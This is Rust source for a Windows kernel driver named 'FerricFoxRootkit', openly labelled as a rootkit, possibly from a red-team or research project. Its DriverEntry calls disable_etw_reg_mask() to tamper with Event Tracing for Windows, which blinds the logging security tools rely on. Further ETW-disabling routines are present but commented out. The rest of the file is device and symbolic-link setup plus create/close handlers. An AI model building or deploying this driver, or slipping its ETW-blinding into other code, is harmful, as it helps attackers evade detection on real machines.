#![feature(map_try_insert)]
#![no_std]
extern crate alloc;

#[cfg(not(test))]
extern crate wdk_panic;

use core::{iter::once, ptr::null_mut};

use alloc::vec::Vec;
use etw::{clear_system_logger_bitmask, disable_etw_reg_mask, disable_single_guid, patch_etw_kernel_table};
use wdk_alloc::WdkAllocator;
#[global_allocator]
static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;

use wdk::{nt_success, println};
use wdk_sys::{
    DEVICE_OBJECT, DO_BUFFERED_IO, DRIVER_OBJECT, FILE_DEVICE_SECURE_OPEN, FILE_DEVICE_UNKNOWN,
    IO_NO_INCREMENT, IRP_MJ_CLOSE, IRP_MJ_CREATE, NTSTATUS, PCUNICODE_STRING, PDEVICE_OBJECT, PIRP,
    PUNICODE_STRING, STATUS_SUCCESS, STATUS_UNSUCCESSFUL, UNICODE_STRING,
    ntddk::{
        IoCreateDevice, IoCreateSymbolicLink, IoDeleteDevice, IoDeleteSymbolicLink,
        IofCompleteRequest, RtlInitUnicodeString,
    },
};

mod etw;

pub static DOS_DEVICE_NAME: &str = "\\??\\FerricFoxRootkit";
pub static DRIVER_UM_NAME: &str = "\\Device\\FerricFoxRootkit";

#[unsafe(export_name = "DriverEntry")] // WDF expects a symbol with the name DriverEntry
pub unsafe extern "system" fn driver_entry(
    driver: &mut DRIVER_OBJECT,
    registry_path: PCUNICODE_STRING,
) -> NTSTATUS {
    println!("[ferric-fox] [i] Rootkit initialising.");

    let status = unsafe { configure_driver(driver, registry_path as *mut _) };

    println!(
        "[ferric-fox] [i] Rootkit configured with status: {}.",
        status
    );

    // patch_etw_kernel_table();
    // clear_system_logger_bitmask();
    // let _ = disable_single_guid();
    let _ = disable_etw_reg_mask();

    status
}

pub unsafe extern "C" fn configure_driver(
    driver: *mut DRIVER_OBJECT,
    _registry_path: PUNICODE_STRING,
) -> NTSTATUS {
    // Configure the strings required for symbolic links and naming
    let mut dos_name = UNICODE_STRING::default();
    let mut nt_name = UNICODE_STRING::default();

    let dos_name_u16: Vec<u16> = DOS_DEVICE_NAME.encode_utf16().chain(once(0)).collect();
    let device_name_u16: Vec<u16> = DRIVER_UM_NAME.encode_utf16().chain(once(0)).collect();

    unsafe { RtlInitUnicodeString(&mut dos_name, dos_name_u16.as_ptr()) };
    unsafe { RtlInitUnicodeString(&mut nt_name, device_name_u16.as_ptr()) };

    // Create the device
    let mut device_object: PDEVICE_OBJECT = null_mut();

    // Configure the drivers general callbacks
    (unsafe { *driver }).MajorFunction[IRP_MJ_CREATE as usize] = Some(ff_create_close); // todo can authenticate requests coming from x
    (unsafe { *driver }).MajorFunction[IRP_MJ_CLOSE as usize] = Some(ff_create_close);
    (unsafe { *driver }).DriverUnload = Some(driver_exit);

    let res = unsafe {
        IoCreateDevice(
            driver,
            0,
            &mut nt_name,
            FILE_DEVICE_UNKNOWN,
            FILE_DEVICE_SECURE_OPEN,
            0,
            &mut device_object,
        )
    };
    if !nt_success(res) {
        println!(
            "[ferric-fox] [-] Unable to create device via IoCreateDevice. Failed with code: {res}."
        );
        return res;
    }

    // Create the symbolic link
    let res = unsafe { IoCreateSymbolicLink(&mut dos_name, &mut nt_name) };
    if res != 0 {
        println!("[ferric-fox] [-] Failed to create driver symbolic link. Error: {res}");

        driver_exit(driver); // cleanup any resources before returning
        return STATUS_UNSUCCESSFUL;
    }

    // Specifies the type of buffering that is used by the I/O manager for I/O requests that are sent to the device stack.
    (unsafe { *device_object }).Flags |= DO_BUFFERED_IO;

    STATUS_SUCCESS
}

extern "C" fn driver_exit(driver: *mut DRIVER_OBJECT) {
    // rm symbolic link
    let mut dos_name = UNICODE_STRING::default();
    let dos_name_u16: Vec<u16> = DOS_DEVICE_NAME.encode_utf16().collect();
    unsafe {
        RtlInitUnicodeString(&mut dos_name, dos_name_u16.as_ptr());
    }
    let _ = unsafe { IoDeleteSymbolicLink(&mut dos_name) };

    // delete the device
    unsafe {
        IoDeleteDevice((*driver).DeviceObject);
    }

    println!("[ferric-fox] [+] Rootkit terminated.");
}

unsafe extern "C" fn ff_create_close(_device: *mut DEVICE_OBJECT, pirp: PIRP) -> NTSTATUS {
    (unsafe { *pirp }).IoStatus.__bindgen_anon_1.Status = STATUS_SUCCESS;
    (unsafe { *pirp }).IoStatus.Information = 0;
    unsafe { IofCompleteRequest(pirp, IO_NO_INCREMENT as i8) };

    println!("[ferric-fox] [i] IRP received...");

    STATUS_SUCCESS
}
